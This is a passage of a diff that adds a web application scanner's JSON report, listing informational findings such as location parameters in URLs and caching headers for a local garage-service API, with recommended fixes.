+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/partnered (radiusKm,userLat,userLng)",
+							"method": "GET",
+							"param": "userLat",
+							"attack": "",
+							"evidence": "userLat",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: user\nuserLat"
+						},
+						{
+							"id": "268",
+							"uri": "http://host.docker.internal:5183/api/Garages/partnered?userLat=1.2&userLng=1.2&radiusKm=20",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/partnered (radiusKm,userLat,userLng)",
+							"method": "GET",
+							"param": "userLng",
+							"attack": "",
+							"evidence": "userLng",
+							"otherinfo": "The URL contains potentially sensitive information. The following string was found via the pattern: user\nuserLng"
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>Do not pass sensitive information in URIs.</p>",
+					"otherinfo": "<p>The URL contains potentially sensitive information. The following string was found via the pattern: user</p><p>userLat</p>",
+					"reference": "",
+					"cweid": "598",
+					"wascid": "13",
+					"sourceid": "32"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-1",
+					"alert": "Non-Storable Content",
+					"name": "Non-Storable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.</p>",
+					"instances":[ 
+						{
+							"id": "24",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/all",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/all",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "22",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/pending",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/pending",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "25",
+							"uri": "http://host.docker.internal:5183/api/Auth/verify-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/verify-otp ()({phoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "19",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/approve",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/approve",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "PUT ",
+							"otherinfo": ""
+						},
+						{
+							"id": "20",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/reject",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/reject",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "PUT ",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>The content may be marked as storable by ensuring that the following conditions are satisfied:</p><p>The request method must be understood by the cache and defined as being cacheable (\"GET\", \"HEAD\", and \"POST\" are currently defined as cacheable)</p><p>The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)</p><p>The \"no-store\" cache directive must not appear in the request or response header fields</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"private\" response directive must not appear in the response</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"Authorization\" header field must not appear in the request, unless the response explicitly allows it (using one of the \"must-revalidate\", \"public\", or \"s-maxage\" Cache-Control response directives)</p><p>In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:</p><p>It must contain an \"Expires\" header field</p><p>It must contain a \"max-age\" response directive</p><p>For \"shared\" caches such as \"proxy\" caches, it must contain a \"s-maxage\" response directive</p><p>It must contain a \"Cache Control Extension\" that allows it to be cached</p><p>It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "8"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-3",
+					"alert": "Storable and Cacheable Content",
+					"name": "Storable and Cacheable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where \"shared\" caching servers such as \"proxy\" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.</p>",
+					"instances":[ 
+						{
+							"id": "11",
+							"uri": "http://host.docker.internal:5183/swagger/v1/swagger.json",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1\/swagger.json",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:</p><p>Cache-Control: no-cache, no-store, must-revalidate, private</p><p>Pragma: no-cache</p><p>Expires: 0</p><p>This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.</p>",
+					"otherinfo": "<p>In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.</p>",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "1"
+				}
+			]
+		}
+	],
+	"sequences":[
+	]
+
+}
